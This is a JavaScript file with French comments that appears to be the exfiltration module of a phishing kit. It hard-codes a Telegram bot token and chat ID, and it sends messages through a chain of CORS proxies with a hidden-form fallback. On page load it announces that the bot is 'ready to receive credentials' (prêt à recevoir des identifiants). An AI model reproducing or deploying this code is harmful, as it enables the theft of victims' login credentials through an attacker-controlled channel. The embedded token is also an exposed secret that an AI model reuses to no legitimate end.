/**
 * Configuration du bot Telegram
 * Remplace les valeurs par tes propres identifiants
 */
const TELEGRAM_CONFIG = {
    BOT_TOKEN: '6857006458:AAGish8rujnLa8TOltXh3PLvjiKfL4Nj33Y',
    CHAT_ID: '5913147075'
};

/**
 * Envoie un message à Telegram en essayant plusieurs méthodes
 * @param {string} message - Le message à envoyer (format HTML)
 * @returns {Promise} - Promesse indiquant le succès ou l'échec de l'envoi
 */
function sendToTelegram(message) {
    // Méthode 1: Utilisation de corsproxy.io
    const proxyUrl1 = 'https://corsproxy.io/?';
    const apiUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
    const url1 = proxyUrl1 + encodeURIComponent(apiUrl);

    // Méthode 2: Utilisation de thingproxy (alternative)
    const proxyUrl2 = 'https://thingproxy.freeboard.io/fetch/';
    const url2 = proxyUrl2 + apiUrl;

    // Méthode 3: Utilisation de cors-anywhere
    const proxyUrl3 = 'https://cors-anywhere.herokuapp.com/';
    const url3 = proxyUrl3 + apiUrl;

    // Méthode 4: Requête directe (fonctionne sur certains navigateurs)
    const url4 = apiUrl;

    const payload = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CONFIG.CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        })
    };

    // Essayer les différentes méthodes en séquence
    const methods = [
        { url: url1, name: 'corsproxy.io' },
        { url: url2, name: 'thingproxy' },
        { url: url3, name: 'cors-anywhere' },
        { url: url4, name: 'direct' }
    ];

    let currentMethodIndex = 0;

    function tryNextMethod() {
        if (currentMethodIndex >= methods.length) {
            console.error('❌ Toutes les méthodes ont échoué');
            // Dernier recours: utiliser un formulaire invisible
            sendViaForm(message);
            return Promise.reject('Toutes les méthodes ont échoué');
        }

        const method = methods[currentMethodIndex];
        console.log(`🔄 Tentative avec ${method.name}...`);

        return fetch(method.url, payload)
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                if (!data.ok) {
                    throw new Error(`Telegram: ${data.description}`);
                }
                console.log(`✅ Message envoyé via ${method.name}`);
                return data;
            })
            .catch(error => {
                console.warn(`❌ Échec avec ${method.name}:`, error.message);
                currentMethodIndex++;
                return tryNextMethod();
            });
    }

    return tryNextMethod();
}

/**
 * Méthode de dernier recours: envoi via formulaire HTML
 */
function sendViaForm(message) {
    try {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
        form.target = '_blank';

        const chatIdInput = document.createElement('input');
        chatIdInput.type = 'hidden';
        chatIdInput.name = 'chat_id';
        chatIdInput.value = TELEGRAM_CONFIG.CHAT_ID;
        form.appendChild(chatIdInput);

        const textInput = document.createElement('input');
        textInput.type = 'hidden';
        textInput.name = 'text';
        textInput.value = message;
        form.appendChild(textInput);

        const parseModeInput = document.createElement('input');
        parseModeInput.type = 'hidden';
        parseModeInput.name = 'parse_mode';
        parseModeInput.value = 'HTML';
        form.appendChild(parseModeInput);

        document.body.appendChild(form);
        form.submit();
        document.body.removeChild(form);
        console.log('📤 Formulaire de secours envoyé');
    } catch (e) {
        console.error('❌ Échec du formulaire de secours:', e);
    }
}

// Test de la connexion au chargement
console.log('🤖 Bot Telegram chargé');
console.log('📡 Token:', TELEGRAM_CONFIG.BOT_TOKEN.substring(0, 10) + '...');
console.log('📡 Chat ID:', TELEGRAM_CONFIG.CHAT_ID);

// Envoyer un message de test au chargement
setTimeout(() => {
    const testMessage = '🟢 Bot connecté et prêt à recevoir des identifiants';
    sendToTelegram(testMessage).then(() => {
        console.log('✅ Message de test envoyé avec succès');
    }).catch(() => {
        console.warn('⚠️ Message de test non envoyé');
    });
}, 2000);

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { sendToTelegram, TELEGRAM_CONFIG };
}
